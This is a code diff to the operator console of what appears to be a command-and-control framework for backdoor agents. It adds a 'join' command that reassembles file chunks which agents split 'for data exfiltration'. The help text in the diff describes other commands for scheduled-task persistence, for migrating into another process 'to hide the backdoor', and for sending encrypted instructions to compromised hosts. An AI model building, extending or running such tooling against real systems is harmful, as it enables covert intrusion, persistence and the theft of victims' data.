@@ -12,6 +12,7 @@ from core.color import *
 import time
 import os
 import donut
+import glob
 
 def Command_Completer(text, state):
     options = [i for i in cmd.COMMANDS if i.startswith(text)]
@@ -55,7 +56,8 @@ class cmd:
      'persist_schtasks',
      'migrate',
      'processlist',
-     'split']
+     'split',
+     'join']
 
     HELPCOMMANDS = [['exit', 'Exit the console , or kill the agent '],
      ['list', 'List all agents'],
@@ -90,7 +92,8 @@ class cmd:
      ['persist_schtasks', 'persistence using schedule tasks'],
      ['migrate', 'migrate to new process ( default nslookup ) to hide the backdoor '],
      ['processlist', 'list processes formated ( Name , ID , Commandline)'],
-     ['split', 'split file to small size files for data exfiltration ( use join.ps1 script to join data )']]
+     ['split', 'split file to small size files for data exfiltration (use join command for files in current server or use join.ps1 script to join data on windows )'],
+     ['join', 'join splited file names ( include the original file name in the path and the script will know the file parts)']]
 
     def help(self, args = None):
         table = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
@@ -493,7 +496,7 @@ class cmd:
             return
         path=' '.join(args[1:])
         while len(MB) == 0:
-            MB = input('please enter the split size in MB')
+            MB = input('please enter the split size in MB ')
             if len(MB)>0:
                 try:
                     Bytes=int(MB)*(1024**2)
@@ -506,3 +509,24 @@ class cmd:
                 continue
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load split.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"split -path "+path+" -chunksize "+str(Bytes)))
+
+    def join(self, args=None):
+
+        if len(args) < 2:
+            print ("Usage join <full Dir path with original file name at the end of path>")
+            return
+        path=' '.join(args[1:])
+        filenames = glob.glob(path+".*.part")
+        list.sort(filenames)
+
+        if len(filenames)==0:
+            print("No files found check the path provided and original file name")
+            return
+        with open(path, 'wb') as outfile:
+
+            for names in filenames:
+
+                with open(names,"rb") as infile:
+
+                    outfile.write(infile.read())
+        outfile.close()
